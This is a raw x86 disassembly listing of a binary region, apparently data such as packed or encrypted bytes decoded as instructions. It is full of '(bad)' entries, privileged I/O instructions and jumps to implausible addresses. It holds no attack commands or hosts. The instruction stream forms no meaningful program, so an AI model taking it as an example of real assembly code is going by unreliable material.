  428c84:	pop    eax
  428c85:	dec    esi
  428c86:	add    BYTE PTR [edx+0x18af6b96],dh
  428c8c:	dec    ebp
  428c8d:	pop    ebp
  428c8e:	ret    
  428c8f:	pop    esp
  428c90:	sbb    DWORD PTR [esp+ebp*8-0x65a07853],ecx
  428c97:	icebp  
  428c98:	int3   
  428c99:	fcomi  st,st(3)
  428c9b:	stos   BYTE PTR es:[edi],al
  428c9c:	adc    BYTE PTR ss:[esi],dl
  428c9f:	outs   dx,BYTE PTR ds:[esi]
  428ca0:	(bad)  
  428ca1:	add    esp,DWORD PTR [esp+edi*4+0x79b8351e]
  428ca8:	add    al,BYTE PTR [edi+0x65515916]
  428cae:	retf   0x8145
  428cb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428cb2:	shr    DWORD PTR [edx+0x3bf4873f],0x33
  428cb9:	in     al,dx
  428cba:	fidiv  WORD PTR [edx+0x220b5a24]
  428cc0:	les    edx,FWORD PTR [esi+ebp*8+0x2fc982e]
  428cc7:	mov    ebx,0x4b8788a4
  428ccc:	sbb    BYTE PTR [ebp+0x7a6f89d1],ch
  428cd2:	(bad)  
  428cd4:	push   0x74
  428cd6:	adc    al,ch
  428cd8:	pusha  
  428cd9:	pop    ebp
  428cda:	repz xlat BYTE PTR ds:[ebx]
  428cdc:	xchg   ecx,esp
  428cde:	stos   BYTE PTR es:[edi],al
  428cdf:	lods   al,BYTE PTR ds:[esi]
  428ce0:	fyl2xp1 
  428ce2:	pop    edx
  428ce3:	push   es
  428ce4:	dec    edx
  428ce5:	add    DWORD PTR [edi+0x2f8c4be],0x85d41d85
  428cef:	in     eax,dx
  428cf0:	push   0x63c3c718
  428cf5:	jo     0x428cab
  428cf7:	pop    ecx
  428cf8:	enter  0x6674,0xd2
  428cfc:	fs adc eax,0x28dab318
  428d02:	mov    eax,ds:0x4e6bb8c2
  428d07:	cld    
  428d08:	inc    eax
  428d09:	loopne 0x428cc8
  428d0b:	rol    DWORD PTR [ecx+eax*1],1
  428d0e:	pop    ecx
  428d0f:	adc    al,0x6a
	...
  428d71:	add    BYTE PTR [eax],al
  428d73:	add    BYTE PTR [ecx-0xace0e4b],al
  428d79:	jne    0x428d3c
  428d7b:	mov    ch,0x90
  428d7d:	int3   
  428d7e:	ins    BYTE PTR es:[edi],dx
  428d7f:	retf   0xd3b9
  428d82:	jo     0x428dd0
  428d84:	aaa    
  428d85:	mov    ch,0x1
  428d87:	add    BYTE PTR ds:0xe5000001,al
  428d8d:	sbb    esi,DWORD PTR [edx-0x3403e555]
  428d93:	hlt    
  428d94:	cmc    
  428d95:	or     ebp,DWORD PTR [ebx-0x7e]
  428d98:	or     dh,BYTE PTR [edi+edx*8-0x4c]
  428d9c:	xor    eax,0xd4bd7ed0
  428da1:	not    ah
  428da3:	sub    eax,0x30cf9bad
  428da8:	jmp    0x34c3f96a
  428dad:	push   cs
  428dae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428daf:	lds    esi,FWORD PTR [ebp+ebx*8+0x729cdbb4]
  428db6:	(bad)  
  428db7:	hlt    
  428db8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428db9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428dba:	jae    0x428def
  428dbc:	pop    ebx
  428dbd:	or     al,0xea
  428dbf:	ficom  DWORD PTR [eax-0x45]
  428dc2:	sti    
  428dc3:	cmp    eax,0xf3176d4b
  428dc8:	inc    edi
  428dc9:	pushf  
  428dca:	(bad)  
  428dcb:	fld    QWORD PTR [ebx-0x4d470c35]
  428dd1:	jge    0x428d56
  428dd3:	inc    edi
  428dd4:	outs   dx,BYTE PTR ds:[esi]
  428dd5:	cld    
  428dd6:	aad    0x44
  428dd8:	mov    bh,0x36
  428dda:	cmc    
  428ddb:	adc    dh,BYTE PTR [esi+0x52bcb0e1]
  428de1:	inc    edx
  428de2:	(bad)  
  428de3:	gs (bad) 
  428de5:	cmp    eax,0x31cba935
  428dea:	(bad)  
  428deb:	ja     0x428e18
  428ded:	cdq    
  428dee:	fiadd  WORD PTR [ebx]
  428df0:	ret    
  428df1:	push   edx
  428df2:	push   esp
  428df3:	mov    ds:0x101d2ab1,eax
  428df8:	jge    0x428e3f
  428dfa:	and    esi,edi
  428dfc:	popa   
  428dfd:	push   0x5f
  428dff:	loope  0x428e36
  428e01:	ret    0x72c6
  428e04:	and    ebx,DWORD PTR [ebx+0x25a0a58b]
  428e0a:	cmp    eax,0xe84b4088
  428e0f:	mov    DWORD PTR [eax+0x3bd43dfe],0xb801f746
  428e19:	or     al,0x4a
  428e1b:	fs enter 0x7634,0xb6
  428e20:	push   esp
  428e21:	arpl   WORD PTR [edi],cx
  428e23:	ficomp DWORD PTR [ebp+0x1247590]
  428e29:	xchg   DWORD PTR [eax-0x2341a67b],esp
  428e2f:	xchg   ecx,eax
  428e30:	jp     0x428e71
  428e32:	mov    ?,WORD PTR ss:[edi+ebx*8-0x35]
  428e37:	aad    0x23
  428e39:	pop    es
  428e3a:	pop    ecx
  428e3b:	out    dx,al
  428e3c:	jne    0x428e39
  428e3e:	ret    0x8247
  428e41:	mov    BYTE PTR [edi],al
  428e43:	cmp    dl,BYTE PTR [ebp+0x29]
  428e46:	jp     0x428df8
  428e48:	inc    esp
  428e49:	fsubr  DWORD PTR [ebp+0x7808d37a]
  428e4f:	sbb    BYTE PTR [edi-0x65],0x30
  428e53:	cvtps2pd xmm6,xmm4
  428e56:	rcl    BYTE PTR [edi+0x56],cl
  428e59:	pop    ebx
  428e5a:	inc    esp
  428e5b:	daa    
  428e5c:	fisttp DWORD PTR [ebx+esi*8+0x66]
  428e60:	nop
  428e61:	xchg   ebx,eax
  428e62:	add    ecx,DWORD PTR [esi-0x22]
  428e65:	mov    dh,0x8b
  428e67:	lods   al,BYTE PTR ds:[esi]
  428e68:	int3   
  428e69:	add    bl,cl
  428e6b:	push   ds
  428e6c:	add    eax,0x1d1e5c7c
  428e71:	sub    cl,bh
  428e73:	cli    
  428e74:	dec    ebp
  428e75:	add    al,0x6b
  428e77:	lock sub ch,dh
  428e7a:	enter  0xd117,0x13
  428e7e:	adc    DWORD PTR [eax+0x585cd48c],eax
  428e84:	or     eax,0xb44f5ff4
  428e89:	cld    
  428e8a:	sbb    DWORD PTR [eax],esi
  428e8c:	ins    BYTE PTR es:[edi],dx
  428e8d:	xchg   ebx,eax
  428e8e:	lahf   
  428e8f:	mov    esp,0x1b
	...
  428ef4:	dec    edi
  428ef5:	pop    ebp
  428ef6:	pop    ecx
  428ef7:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428efb:	fstp   st(1)
  428efd:	ror    DWORD PTR [esp+edx*4],0x36
  428f01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428f02:	sub    DWORD PTR [edi+0x1b63c],edx
  428f08:	add    eax,0x22000001
  428f0d:	popa   
  428f0e:	cmc    
  428f0f:	cmc    
  428f10:	ret    0xc413
  428f13:	enter  0x3a95,0x61
  428f17:	fldenv ds:0xa5eba9e2
  428f1d:	add    bh,BYTE PTR [esi-0x43]
  428f20:	pminub mm1,mm3
  428f23:	mov    al,0x9
  428f25:	lods   eax,DWORD PTR ds:[esi]
  428f26:	inc    edx
  428f27:	je     0x428f10
  428f29:	enter  0xf31a,0x39
  428f2d:	dec    ebp
  428f2e:	or     BYTE PTR [esp+edi*4],0xc3
  428f32:	scas   eax,DWORD PTR es:[edi]
  428f33:	imul   edx,DWORD PTR [ebp+0x3c],0xffffffec
  428f37:	es jecxz 0x428f24
  428f3a:	or     DWORD PTR [edx-0x28d85ebb],edi
  428f40:	mov    dh,0xa8
  428f42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428f43:	mov    esp,0x130f3346
  428f48:	sub    dh,BYTE PTR [ebp-0x2cb93f8a]
  428f4e:	(bad)  [ebp+0x2d]
  428f51:	loopne 0x428f4a
  428f53:	jl     0x428f4f
  428f55:	pop    eax
  428f56:	repz rcl DWORD PTR [edx-0x3b],0xaa
  428f5b:	enter  0x7da4,0x76
  428f5f:	pop    edx
  428f60:	ret    
  428f61:	push   es
  428f62:	sbb    BYTE PTR [edx-0x6e],dh
  428f65:	xor    al,0x63
  428f67:	test   ecx,ebx
  428f69:	int    0x93
  428f6b:	call   0x13bc8ec4
  428f70:	gs lahf 
  428f72:	in     eax,0xe8
  428f74:	mov    esp,0x9ba4d6c5
  428f79:	adc    eax,0xd0338e73
  428f7e:	enter  0xc605,0x80
  428f82:	rcr    DWORD PTR [esi+eax*4+0x3e],0x25
  428f87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428f88:	mov    edx,0xf8b44fd3
  428f8d:	cmp    cl,BYTE PTR [ecx+ecx*8]
  428f90:	gs push ss
  428f92:	jns    0x429000
  428f94:	mov    bl,0x5b
  428f96:	pop    ebx
  428f97:	pop    esi
  428f98:	sub    bh,bl
  428f9a:	fs aas 
  428f9c:	aad    0xd3
  428f9e:	mov    dl,0x8c
  428fa0:	in     eax,dx
  428fa1:	cdq    
  428fa2:	dec    ebp
  428fa3:	push   ebp
  428fa4:	ror    BYTE PTR [esp+ecx*8+0x2de18b6d],cl
  428fab:	rol    eax,1
  428fad:	and    eax,0xade3c0ab
  428fb2:	out    dx,eax
  428fb3:	jl     0x428f3a
  428fb5:	mov    bh,0xcb
  428fb7:	(bad)  
  428fb9:	std    
  428fba:	ins    BYTE PTR es:[edi],dx
  428fbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428fbd:	xchg   ecx,eax
  428fbe:	or     dh,dh
  428fc0:	test   DWORD PTR [esi],ecx
  428fc2:	mov    eax,0x224aad6c
  428fc7:	pop    es
  428fc8:	lahf   
  428fc9:	fadd   QWORD PTR [esi+esi*2-0x482c243]
  428fd0:	push   ebx
  428fd1:	xor    eax,0x7c09071a
  428fd6:	sub    BYTE PTR ds:0x2c252d46,bl
  428fdc:	or     al,dh
  428fde:	cdq    
  428fdf:	lea    esp,[esi]
  428fe1:	push   ebx
  428fe2:	push   0xe26e7a0b
  428fe7:	add    al,0x92
  428fe9:	mov    ss,WORD PTR [ecx-0x52]
  428fec:	mov    edx,DWORD PTR [esp+esi*2+0x4a796c47]
  428ff3:	jbe    0x428fb5
  428ff5:	jnp    0x42902c
  428ff7:	adc    eax,DWORD PTR [eax+0x70227c4d]
  428ffd:	ss or  al,0xe7
  429000:	fisub  WORD PTR [esi]
  429002:	scas   al,BYTE PTR es:[edi]
  429003:	ds inc eax
  429005:	inc    ebx
  429006:	pop    ebp
  429007:	imul   ebp,edi,0xba2049d1
  42900d:	jo     0x428fd3
  42900f:	scas   al,BYTE PTR es:[edi]
  429010:	stos   DWORD PTR es:[edi],eax
	...
  429071:	add    BYTE PTR [eax],al
  429073:	add    cl,ah
  429075:	in     al,dx
  429076:	mov    ebx,es
  429078:	(bad)  
  429079:	jecxz  0x42906a
  42907b:	out    dx,al
  42907c:	mov    edi,0x6ffc7b77
  429081:	hlt    
  429082:	mov    edi,0x1b74115
  429087:	add    BYTE PTR ds:0x17000001,al
  42908d:	sbb    DWORD PTR [ebx-0xdaeb],edi
  429093:	pop    edi
  429094:	mov    al,ds:0xffc9f6cc
  429099:	dec    esp
  42909a:	sbb    DWORD PTR es:[ebp-0x56c3d03b],edx
  4290a1:	ret    0x2c39
  4290a4:	int    0x0
  4290a6:	add    BYTE PTR [edx+ebx*8],dh
  4290a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4290aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4290ab:	and    edi,DWORD PTR [ecx+0x5e]
  4290ae:	dec    edx
  4290af:	or     eax,0x1889df8a
  4290b4:	sbb    cl,BYTE PTR ds:0x2d27251e
  4290bb:	mov    ecx,0x33e7e577
  4290c0:	(bad)  
  4290c2:	cli    
  4290c3:	fwait
  4290c4:	add    al,BYTE PTR [eax]
  4290c6:	loope  0x429078
  4290c8:	jmp    0xfc856a88
  4290cd:	sub    dl,ah
  4290cf:	mov    bl,0x7e
  4290d1:	dec    ecx
  4290d2:	push   eax
  4290d3:	arpl   WORD PTR [eax-0x15],sp
  4290d6:	adc    ebx,DWORD PTR [eax]
  4290d8:	push   0xffffff96
  4290da:	inc    esi
  4290db:	xchg   edi,eax
  4290dc:	dec    eax
  4290dd:	(bad)  
  4290de:	aad    0x29
  4290e0:	inc    esp
  4290e1:	fstp   TBYTE PTR [edx+0x38]
  4290e4:	retf   
  4290e5:	jp     0x429092
  4290e7:	fcmovne st,st(5)
  4290e9:	sub    al,0x36
  4290eb:	fcmovnbe st,st(4)
  4290ed:	mov    ds:0x85ea42f,eax
  4290f2:	push   ds
  4290f3:	or     BYTE PTR [edi+0x25],bl
  4290f6:	dec    ebx
  4290f7:	fwait
  4290f8:	inc    edx
  4290f9:	scas   eax,DWORD PTR es:[edi]
  4290fa:	ret    
  4290fb:	int    0x60
  4290fd:	or     DWORD PTR ds:0x649454c7,0x4fe8ee53
  429107:	(bad)  
  429108:	nop
  429109:	data16 mov ch,0x9c
  42910c:	or     al,0x84
  42910e:	cld    
  42910f:	dec    esi
  429110:	push   edx
  429111:	push   edx
  429112:	popa   
  429113:	les    edi,FWORD PTR [ebp-0x58c8c887]
  429119:	(bad)  
  42911a:	jnp    0x4290cd
  42911c:	aaa    
  42911d:	sbb    BYTE PTR [esi-0x1d],bl
  429120:	pop    ecx
  429121:	pop    esp
  429122:	cmp    DWORD PTR [eax],esp
  429124:	lods   al,BYTE PTR ds:[esi]
  429125:	loop   0x4291a1
  429127:	jo     0x4291a8
  429129:	icebp  
  42912a:	pop    esp
  42912b:	fsubr  DWORD PTR [esi]
  42912d:	sub    ebp,0xaa250487
  429133:	cld    
  429134:	into   
  429135:	push   fs
  429137:	add    eax,DWORD PTR [ecx-0x1c]
  42913a:	and    ebp,DWORD PTR [edi+0x14]
  42913d:	rcr    DWORD PTR gs:[ebp-0x79b0f799],0xee
  429145:	add    eax,0x6b94eaba
  42914a:	ret    
  42914b:	aam    0x63
  42914d:	cs aaa 
  42914f:	out    dx,eax
  429150:	nop
  429151:	mov    ch,0x8f
  429153:	inc    eax
  429154:	retf   
  429155:	pop    ebp
  429156:	cmp    DWORD PTR [ebp+0x26],esi
  429159:	outs   dx,BYTE PTR ds:[esi]
  42915a:	(bad)  
  42915c:	fnstsw WORD PTR [esi-0x4038fcca]
  429162:	mov    DWORD PTR [edi-0x28],esi
  429165:	jl     0x4291a5
  429167:	rcl    DWORD PTR [edx+0x53043596],1
  42916d:	jno    0x42913c
  42916f:	leave  
  429170:	fsub   st(6),st
  429172:	lods   eax,DWORD PTR ds:[esi]
  429173:	cli    
  429174:	jae    0x4291ed
  429176:	pop    ecx
  429177:	std    
  429178:	add    esp,DWORD PTR [eax-0x357dc4b2]
  42917e:	test   DWORD PTR [ebp-0x63],0x9d845e2b
  429185:	mov    ebx,esi
  429187:	and    edi,esi
  429189:	mov    bh,0x82
  42918b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42918c:	adc    eax,0x5a6ad6e
	...
  4291f1:	add    BYTE PTR [eax],al
  4291f3:	add    BYTE PTR [esi-0x79],dl
  4291f6:	std    
  4291f7:	test   ch,bh
  4291f9:	(bad)  
  4291fa:	jg     0x4291d3
  4291fc:	into   
  4291fd:	retf   
  4291fe:	or     DWORD PTR [eax+eiz*4+0x46b5da5f],0x50001b8
  429209:	add    DWORD PTR [eax],eax
  42920b:	add    BYTE PTR [eax],cl
  42920d:	cdq    
  42920e:	sbb    DWORD PTR [edi+0x47],eax
  429211:	xchg   ecx,eax
  429213:	cli    
  429214:	imul   ebp,DWORD PTR [esi-0x567440c7],0x41fd375e
  42921e:	add    eax,0x1a9980b3
  429223:	(bad)  
  429224:	jmp    0x429242
  429226:	xchg   ebp,eax
  429227:	mov    ah,BYTE PTR [edx]
  429229:	fwait
  42922a:	pop    esp
  42922b:	xchg   ebp,eax
  42922c:	sbb    BYTE PTR [ecx],dl
  42922e:	and    cl,ch
  429230:	fs jge 0x42929a
  429233:	mov    eax,ds:0x65fdfe10
  429238:	or     al,0x53
  42923a:	push   esi
  42923b:	adc    ecx,DWORD PTR [esi+edi*8+0x64]
  42923f:	xchg   edi,eax
  429240:	cmp    cl,bh
  429242:	loop   0x4291f2
  429244:	adc    eax,0x14d8f50
  429249:	(bad)  
  42924a:	cmp    DWORD PTR [ecx],ebx
  42924c:	cmp    esp,esp
  42924e:	es push ebp
  429250:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429251:	xchg   edi,eax
  429252:	jnp    0x42925e
  429254:	std    
  429255:	mov    ebp,0x2f81830
  42925a:	adc    cl,cl
  42925c:	push   esp
  42925d:	mov    dl,0x34
  42925f:	cmp    ebp,esi
  429261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429262:	loop   0x4292d9
  429264:	stos   DWORD PTR es:[edi],eax
  429265:	test   DWORD PTR [ebx],ebx
  429267:	repnz sub al,0xfb
  42926a:	(bad)
  42926d:	(bad)  
  42926e:	sbb    al,0xd2
  429270:	pop    edx
  429271:	sub    ch,BYTE PTR [eax]
  429273:	add    BYTE PTR [ebp+0x73],bl
  429276:	mov    edx,0x2112ddb4
  42927b:	inc    edx
  42927c:	lahf   
  42927d:	adc    al,BYTE PTR [edi+esi*2+0x27bd4fc3]
  429284:	mov    ebx,0xdc01dcdf
  429289:	test   al,0xb1
  42928b:	mov    esp,0x1ce23b4c
  429290:	mov    esi,0xc93afeb9
  429295:	gs adc eax,0xf6b3020f
  42929b:	daa    
  42929c:	fdiv   st,st(3)
  42929e:	or     al,0x3a
  4292a0:	and    edx,0x75e90167
  4292a6:	aas    
  4292a7:	loope  0x429277
  4292a9:	adc    ebx,DWORD PTR ds:0xd029f8f2
  4292af:	mov    esi,DWORD PTR [ebx]
  4292b1:	cmp    eax,0x7cfa6a2c
  4292b6:	test   eax,0x5d54792f
  4292bb:	fnstcw WORD PTR [ecx]
  4292bd:	leave  
  4292be:	and    ah,BYTE PTR [esi]
  4292c0:	add    eax,0x94979848
  4292c5:	dec    ecx
  4292c6:	daa    
  4292c7:	std    
  4292c8:	(bad)  ss:[esi+0x2b]
  4292cc:	(bad)  
  4292cd:	jg     0x429281
  4292cf:	cli    
  4292d0:	lea    ecx,gs:[ebx+0x48e195be]
  4292d7:	loope  0x42930c
  4292d9:	add    DWORD PTR [eax+0xbb2a932],esp
  4292df:	mov    bh,dl
  4292e1:	dec    esi
  4292e2:	hlt    
  4292e3:	mov    DWORD PTR [esi],ebp
  4292e5:	mov    ebp,0xae8fd0bd
  4292ea:	xchg   ecx,eax
  4292eb:	adc    BYTE PTR [eax+0x24],dl
  4292ee:	lea    ebx,[eax+0x9]
  4292f1:	enter  0xa50a,0x20
  4292f5:	mov    al,ds:0x27d03f4
  4292fa:	xchg   esp,eax
  4292fb:	in     eax,dx
  4292fc:	mov    BYTE PTR [ecx-0x7a],cl
  4292ff:	out    dx,al
  429300:	out    dx,eax
  429301:	js     0x429338
  429303:	jmp    0x4c246f7f
  429308:	xor    ah,bh
  42930a:	mov    bl,0x4b
  42930c:	jmp    DWORD PTR [ebp+0x6d]
  42930f:	push   ebp
  429310:	push   edi
	...
  429371:	add    BYTE PTR [eax],al
  429373:	add    al,dh
  429375:	adc    al,0xe1
  429377:	(bad)  
  429378:	in     eax,0xff
  42937a:	call   FWORD PTR [esi]
  42937c:	jae    0x429383
  42937e:	dec    edx
  42937f:	mov    bh,0x5b
  429381:	(bad)  
  429382:	sbb    DWORD PTR [ebp+0x1b94b],esi
  429388:	add    eax,0x2b000001
  42938d:	cs cmc 
  42938f:	aad    0x94
  429391:	or     edx,ebx
  429393:	pop    ds
  429394:	adc    DWORD PTR [eax+0x6ae71dc9],esp
  42939a:	inc    eax
  42939b:	ror    DWORD PTR [esi+edx*1+0x14075127],cl
  4293a2:	mov    edi,0xafd3659f
  4293a7:	sbb    BYTE PTR [esi-0x5ce97394],bl
  4293ad:	or     esp,DWORD PTR [ebx-0x41]
  4293b0:	mov    esi,DWORD PTR [esi+0x25d0828c]
  4293b6:	lea    ecx,[edx+ebx*8-0x5a09d13c]
  4293bd:	pushf  
  4293be:	ins    BYTE PTR es:[edi],dx
  4293bf:	mov    ebp,0x8d2474c0
  4293c4:	or     al,0x89
  4293c6:	hlt    
  4293c7:	xor    bl,BYTE PTR [edx+esi*1-0x37accdb3]
  4293ce:	push   cs
  4293cf:	mov    ah,0x1a
  4293d1:	ins    BYTE PTR es:[edi],dx
  4293d2:	adc    eax,DWORD PTR [esi+0xcd7f893]
  4293d8:	mov    eax,0x1ebf4b14
  4293dd:	imul   edx,DWORD PTR [eax],0xffffffda
  4293e0:	out    0x30,eax
  4293e2:	add    eax,0x2f236d89
  4293e7:	(bad)  
  4293e8:	test   al,0x24
  4293ea:	xor    dl,BYTE PTR [edi+0x67]
  4293ed:	in     al,0xe8
  4293ef:	dec    edx
  4293f0:	cmp    al,0xd5
  4293f2:	hlt    
  4293f3:	or     BYTE PTR [esi-0x19ee74e4],bl
  4293f9:	adc    cl,BYTE PTR [edi+0x3402be5a]
  4293ff:	push   ds
  429400:	pop    esi
  429401:	hlt    
  429402:	std    
  429403:	(bad)  
  429405:	inc    edi
  429406:	or     edx,DWORD PTR [esi-0x3434ad50]
  42940c:	jge    0x429461
  42940e:	push   esp
  42940f:	xchg   edi,eax
  429410:	jns    0x429459
  429412:	cmp    eax,0x9ad27bd0
  429417:	jecxz  0x4293ff
  429419:	mov    BYTE PTR [ebp+0x4908ae10],cl
  42941f:	and    dl,dl
  429421:	ret    0xb3ab
  429424:	mov    eax,ds:0xda73554e
  429429:	or     ch,ah
  42942b:	mov    ebp,0x41ffb9db
  429430:	in     eax,dx
  429431:	dec    edx
  429432:	jecxz  0x429457
  429434:	jo     0x429478
  429436:	and    bh,BYTE PTR [edi]
  429438:	and    al,0x82
  42943a:	fmul   QWORD PTR [esi]
  42943c:	enter  0x8c16,0xdc
  429440:	jp     0x429495
  429442:	inc    ebx
  429443:	jecxz  0x4293f2
  429445:	mov    dh,0xf4
  429447:	out    0x59,al
  429449:	pop    edx
  42944a:	loope  0x429459
  42944c:	push   0x49530cb0
  429451:	ins    DWORD PTR es:[edi],dx
  429452:	pop    esp
  429453:	les    ebp,FWORD PTR [esi-0x21d5c886]
  429459:	jae    0x4293e7
  42945b:	(bad)  
  42945c:	pop    ss
  42945d:	pop    ds
  42945e:	adc    BYTE PTR [ecx],dh
  429460:	stc    
  429461:	dec    esi
  429462:	repnz rcl BYTE PTR ds:[ecx+0x7af1d3a7],0xdb
  42946b:	fbld   TBYTE PTR [ecx]
  42946d:	dec    eax
  42946e:	je     0x429416
  429470:	add    edx,edi
  429472:	cmc    
  429473:	dec    esi
  429474:	xchg   ebp,eax
  429475:	or     ch,0xa4
  429478:	sub    BYTE PTR [ecx],bh
  42947a:	test   al,0x9b
  42947c:	scas   eax,DWORD PTR es:[edi]
  42947d:	add    al,0xa9
  42947f:	xchg   ebp,eax
  429480:	jg     0x429414
  429482:	out    dx,eax
  429483:	pop    ebx
  429484:	or     ecx,DWORD PTR [edx]
  429486:	outs   dx,DWORD PTR ds:[esi]
  429487:	jecxz  0x42949d
  429489:	mov    edi,0xd7eab4df
  42948e:	fdivr  DWORD PTR ds:0xfe
	...
  4294f4:	dec    esp
  4294f5:	or     eax,0x3e532c13
  4294fa:	jg     0x429569
  4294fc:	dec    esp
  4294fd:	arpl   WORD PTR [ebp+0x2ac009ea],dx
  429503:	daa    
  429504:	push   eax
  429505:	mov    edx,0x1050001
  42950a:	add    BYTE PTR [eax],al
  42950c:	pop    ecx
  42950d:	(bad)  
  42950e:	cmc    
  42950f:	into   
  429510:	sahf   
  429511:	mov    al,ds:0x7c5855d0
  429516:	fsub   st(7),st
  429518:	call   0xa4ba:0xb6231102
  42951f:	cwde   
  429520:	or     bl,bl
  429522:	fcomp  QWORD PTR [edx-0x2f]
  429525:	shl    DWORD PTR cs:[esi+eax*4+0x57],1
  42952a:	jno    0x4294be
  42952c:	int    0x24
  42952e:	jb     0x429542
  429530:	out    dx,al
  429531:	jb     0x42954c
  429533:	enter  0xe7fc,0xf4
  429537:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429538:	adc    al,BYTE PTR [eax+0x51]
  42953b:	lds    edi,FWORD PTR [ebp-0x4e7207d3]
  429541:	fdiv   DWORD PTR [edx-0x28]
  429544:	jg     0x42959e
  429546:	mov    DWORD PTR [esi-0x79],esp
  429549:	rol    DWORD PTR [esi-0x5d],0x28
  42954d:	enter  0x76ee,0xea
  429551:	dec    edi
  429552:	adc    al,0x6a
  429554:	or     al,0x61
  429556:	pop    ss
  429557:	jmp    0x4294ec
  429559:	popf   
  42955a:	push   0xfffffffd
  42955c:	cmp    bl,BYTE PTR [ebp-0x63]
  42955f:	jbe    0x429519
  429561:	stc    
  429562:	pop    es
  429563:	and    al,0xaa
  429565:	mov    esp,0x37142d76
  42956a:	lahf   
  42956b:	ficomp DWORD PTR [ebp+0x11]
  42956e:	js     0x429548
  429570:	cdq    
  429571:	icebp  
  429572:	into   
  429573:	mov    ebp,0xc380a19c
  429578:	pop    edx
  429579:	cmp    al,0x4b
  42957b:	and    BYTE PTR [esi],dh
  42957d:	jecxz  0x4295b3
  42957f:	sbb    eax,0xdd4590b8
  429584:	sub    dh,BYTE PTR [eax-0x6ef95ae7]
  42958a:	stos   DWORD PTR es:[edi],eax
  42958b:	dec    eax
  42958c:	or     eax,0xf5d7404f
  429591:	sbb    al,ah
  429593:	jmp    0x7a5d:0xc4842f25
  42959a:	rcr    dh,cl
  42959c:	push   ss
  42959d:	dec    esp
  42959e:	push   edi
  42959f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4295a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4295a1:	mov    DWORD PTR [eax],ebp
  4295a3:	inc    ebx
  4295a4:	cmp    al,0x6a
  4295a6:	inc    edx
  4295a7:	mov    edi,0x6255354e
  4295ac:	cmp    dh,bh
  4295ae:	loopne 0x429624
  4295b0:	mov    bh,0xc
  4295b2:	out    dx,eax
  4295b3:	jge    0x42954b
  4295b5:	inc    edx
  4295b6:	mov    edx,DWORD PTR [edi]
  4295b8:	mov    WORD PTR [edx+0x3d],ss
  4295bb:	sub    DWORD PTR [ecx+0x1],ecx
  4295be:	les    ebp,FWORD PTR [edx+0x3520684e]
  4295c4:	dec    eax
  4295c5:	std    
  4295c6:	lods   al,BYTE PTR ds:[esi]
  4295c7:	xchg   ebp,eax
  4295c8:	xor    dh,cl
  4295ca:	int    0x40
  4295cc:	jge    0x4295b3
  4295ce:	retf   0xab4a
  4295d1:	push   ebp
  4295d2:	dec    edi
  4295d4:	xor    al,BYTE PTR [esi+0x5c]
  4295d7:	lods   al,BYTE PTR ds:[esi]
  4295d8:	hlt    
  4295d9:	(bad)  
  4295da:	out    0x5c,eax
  4295dc:	xor    dh,BYTE PTR [eax+0x4a]
  4295df:	out    dx,eax
  4295e0:	jo     0x429613
  4295e2:	leavew 
  4295e4:	xchg   ebx,eax
  4295e5:	ins    BYTE PTR es:[edi],dx
  4295e6:	cmp    DWORD PTR [eax+ecx*1-0x26],edx
  4295ea:	retf   
  4295eb:	fidiv  WORD PTR [esi+0x23]
  4295ee:	ret    0xec29
  4295f1:	mov    ebx,0xb88de15e
  4295f6:	repnz scas eax,DWORD PTR es:[edi]
  4295f8:	mov    ds:0x31ddace9,eax
  4295fd:	mov    ah,0xdb
  4295ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429600:	test   al,0x13
  429602:	jb     0x429673
  429604:	jmp    0xd0b94e26
  429609:	add    al,0xb0
  42960b:	stos   BYTE PTR es:[edi],al
  42960c:	lods   eax,DWORD PTR ds:[esi]
  42960d:	xor    dl,ah
  42960f:	fcomp  DWORD PTR [ebp+0x0]
	...
  429672:	add    BYTE PTR [eax],al
  429674:	ins    DWORD PTR es:[edi],dx
  429675:	sbb    eax,0xfbf6c0e6
  42967a:	outs   dx,DWORD PTR ds:[esi]
  42967b:	mov    ebp,0xab7b5cea
  429680:	pushf  
  429681:	xor    al,0x7c
  429683:	pop    ebp
  429684:	push   ebp
  429685:	mov    ebx,0x1050001
  42968a:	add    BYTE PTR [eax],al
  42968c:	not    esi
  42968e:	xor    BYTE PTR [ebx],dl
  429690:	inc    edx
  429691:	sub    BYTE PTR [edi],0x16
  429694:	shl    DWORD PTR [esi-0x4973cdbd],1
  42969a:	cmp    BYTE PTR [esi],al
  42969c:	(bad)  
  42969d:	and    eax,0x893886ec
  4296a2:	sbb    ah,al
  4296a4:	add    BYTE PTR [ebx+0x4],ch
  4296a7:	push   es
  4296a8:	outs   dx,BYTE PTR ds:[esi]
  4296a9:	inc    eax
  4296aa:	lds    ebx,FWORD PTR [ecx+0x26]
  4296ad:	inc    esp
  4296ae:	or     DWORD PTR [edi],eax
  4296b0:	cs and eax,0xcacb088a
  4296b6:	cwde   
  4296b7:	xchg   edx,eax
  4296b8:	pop    ecx
  4296b9:	xchg   DWORD PTR [ecx+0xa0e9186],edx
  4296bf:	mov    edx,0x54839228
  4296c4:	xchg   ebp,eax
  4296c5:	popa   
  4296c6:	sti    
  4296c7:	fadd   DWORD PTR [ecx-0x5]
  4296ca:	jecxz  0x429694
  4296cc:	fucomip st,st(1)
  4296ce:	jl     0x4296c7
  4296d0:	push   es
  4296d1:	mov    edi,0x8e31a4f5
  4296d6:	jo     0x4296e3
  4296d8:	cli    
  4296d9:	sbb    cl,dh
  4296db:	sub    eax,0xb9b6d837
  4296e0:	push   0xffffffcc
  4296e2:	sar    cl,0xad
  4296e5:	ds dec ebx
